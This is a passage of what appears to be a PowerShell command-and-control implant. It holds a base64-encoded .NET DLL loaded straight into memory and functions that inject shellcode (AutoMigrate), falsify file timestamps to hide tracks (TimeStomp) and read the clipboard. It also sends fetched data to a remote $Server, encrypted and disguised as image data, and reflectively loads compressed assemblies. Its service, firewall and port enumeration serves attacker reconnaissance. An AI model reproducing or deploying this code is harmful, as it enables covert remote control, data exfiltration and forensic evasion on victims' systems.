ABDQB0BAMABIAAAAEAAAAAAAAAAAAAAAAA8AQAAAIAAAAAAAAAAAAAAH0AhAAAAAAAAgAAAAAAAAAAAAAAfQBSAwAAAAADAAIABAACAAAAAFBST0NFU1NFTlRSWTMyAE1vZHVsZTMyAGtlcm5lbDMyAFVJbnQzMgA8TW9kdWxlPgB0aDMyTW9kdWxlSUQAdGgzMkRlZmF1bHRIZWFwSUQAdGgzMlByb2Nlc3NJRAB0aDMyUGFyZW50UHJvY2Vzc0lEAE1BWF9QQVRIAHZhbHVlX18AbXNjb3JsaWIAR2V0UHJvY2Vzc0J5SWQAVGhyZWFkAEFwcGVuZABjbnRVc2FnZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGdldF9IYW5kbGUAUnVudGltZVR5cGVIYW5kbGUAQ2xvc2VIYW5kbGUAR2V0VHlwZUZyb21IYW5kbGUAVG9rZW5IYW5kbGUAUHJvY2Vzc0hhbmRsZQBwcm9jZXNzSGFuZGxlAHN6RXhlRmlsZQBNb2R1bGUAZ2V0X05hbWUAbHBwZQBWYWx1ZVR5cGUAcGNQcmlDbGFzc0Jhc2UAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBnZXRfU2l6ZQBkd1NpemUAU2l6ZU9mAEluZGV4T2YAVG9TdHJpbmcAU3Vic3RyaW5nAGlzMzJiaXRhcmNoAE1hcnNoYWwAU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbABBbGwAYWR2YXBpMzIuZGxsAGtlcm5lbDMyLmRsbABHZXQtUHJvY2Vzc0xpc3QuZGxsAFN5c3RlbQBFbnVtAE9wZW5Qcm9jZXNzVG9rZW4AU3lzdGVtLlJlZmxlY3Rpb24ARXhjZXB0aW9uAFplcm8AU3RyaW5nQnVpbGRlcgBQcm9jSGFuZGxlcgBHZXRQcm9jZXNzVXNlcgAuY3RvcgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAGNudFRocmVhZHMAU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMARGVidWdnaW5nTW9kZXMAR2V0UHJvY2Vzc2VzAFNuYXBzaG90RmxhZ3MAZHdGbGFncwBDb250YWlucwBOb0hlYXBzAERlc2lyZWRBY2Nlc3MASXNXb3c2NFByb2Nlc3MAd293NjRQcm9jZXNzAHByb2Nlc3MAQ29uY2F0AGhPYmplY3QAUGFkUmlnaHQASW5oZXJpdABFbnZpcm9ubWVudABDcmVhdGVUb29saGVscDMyU25hcHNob3QAaFNuYXBzaG90AEhlYXBMaXN0AEdldC1Qcm9jZXNzTGlzdABQcm9jZXNzMzJGaXJzdABQcm9jZXNzMzJOZXh0AFN5c3RlbS5UZXh0AG9wX0luZXF1YWxpdHkAV2luZG93c0lkZW50aXR5AAAAB1AASQBEAAAJVQBTAEUAUgAACUEAUgBDAEgAAAlQAFAASQBEAAALTgBBAE0ARQAKAAAHPQA9AD0AAAk9AD0APQA9AAALPQA9AD0APQAKAAABAAd4ADgANgAAB3gANgA0AAADCgAALVAAUgBPAEMARQBTAFMATwBSAF8AQQBSAEMASABJAFQARQBXADYANAAzADIAAANcAAAAAABUK5mQveotQKRjSc5+aAIMAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQILBwYSQRgSRREQDgICBhgGAAESXRFhBQABCBJdBCABDggFAAEOHQ4FIAESRQ4FAAESQQgDIAAYAyAADgMHAQ4EAAEODgMAAAgFBwMYDg4EIAEBGAQgAQIOBCABCA4FAAICGBgIt3pcVhk04IkEAQAAAAQCAAAABAQAAAAECAAAAAQQAAAABAAAAIAEHwAAAAQAAABABAQBAAADF4EEAQICBgkDBhEMAgYIAg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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAwAAAA0MQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
    $dllbytes  = [System.Convert]::FromBase64String($ps)
    $assembly = [System.Reflection.Assembly]::Load($dllbytes)
}
try{
    $r = [ProcHandler]::GetProcesses()
    echo $r
} catch {
    echo $error[0]
}
}
Function Invoke-Netstat {
try {
    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
    $Connections = $TCPProperties.GetActiveTcpListeners()
    foreach($Connection in $Connections) {
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }
        $OutputObj = New-Object -TypeName PSobject
        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address
        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port
        $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType
        $OutputObj
    }

} catch {
    Write-Error "Failed to get listening connections. $_"
}
}
Function Get-Webpage {
    param (
        [string] $url,
        [string] $TaskId
    )
    $file = (New-Object System.Net.Webclient).DownloadString($url)|Out-String
    $eid = Encrypt-String $key $TaskId
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($file)
    $base64 = [Convert]::ToBase64String($bytes)
    $Output = Encrypt-String2 $key $base64
    $UploadBytes = getimgdata $Output
    (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
}
Function AutoMigrate {
if (($p = Get-Process | ? {$_.id -eq $pid}).name -eq "powershell") {
    $t=$true
}
if ($t -and [IntPtr]::size -eq 8){
   Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode64))
}
elseif (($t -and [IntPtr]::size -eq 4)) {
    Inject-Shellcode -x86 -Shellcode ([System.Convert]::FromBase64String($Shellcode86))
}
}
Function AutoMigrate-Always {
if ([IntPtr]::size -eq 8){
   Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode64))
}
elseif ([IntPtr]::size -eq 4) {
    Inject-Shellcode -x86 -Shellcode ([System.Convert]::FromBase64String($Shellcode86))
}
}
Function TimeStomp($File, $Date) {
    $file=(gi $file -force)
    $file.LastWriteTime=$date;
    $file.LastAccessTime=$date;
    $file.CreationTime=$date;
}
Function Get-Clipboard {
    add-type -a system.windows.forms
    [windows.forms.clipboard]::GetText()
}
Function Get-AllServices {
    $Keys = Get-ChildItem HKLM:\System\CurrentControlSet\services; $Items = $Keys | Foreach-Object {Get-ItemProperty $_.PsPath }
    ForEach ($Item in $Items) {$n=$Item.PSChildName;$i=$Item.ImagePath;$d=$Item.Description; echo "Name: $n `nImagePath: $i `nDescription: $d`n"}
}
Function Get-AllFirewallRules($path) {
    $Rules=(New-object -comObject HNetCfg.FwPolicy2).rules
    if ($path) {
        $Rules | export-csv $path -NoTypeInformation
    } else {
        $Rules
    }
}

$script:genurl=${function:GenerateURL}
$script:sendresp=${function:Send-ResponseAsync}
$script:sendrespkey=${variable:key}

function loadCompressedAsm()
{
    Param ( [string]$cmpdAsm )
    try
    {
        $Delay = $Delay *1000
        if (![String]::IsNullOrEmpty($cmpdAsm))
        {
            [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream(45000)
            [System.IO.MemoryStream] $gzdll = New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String($cmpdAsm))
            $gzipStream = New-Object System.IO.Compression.GzipStream $gzdll, ([IO.Compression.CompressionMode]::Decompress)
            try
            {
                $buffer = New-Object byte[](32000);
                while($true)
                {
                    $read=$gzipStream.Read($buffer, 0, 32000)
                    if($read -le 0) {break}
                    $output.Write($buffer, 0, $read)
                }
            }
            finally
            {
                $gzipStream.Close()
                $output.Close()
                $gzdll.Close()
            }
            return [System.Reflection.Assembly]::Load($output.ToArray());
        }
        else
        {
            return $null;
        }
    }
    catch
    {
        return $null;
    }
}
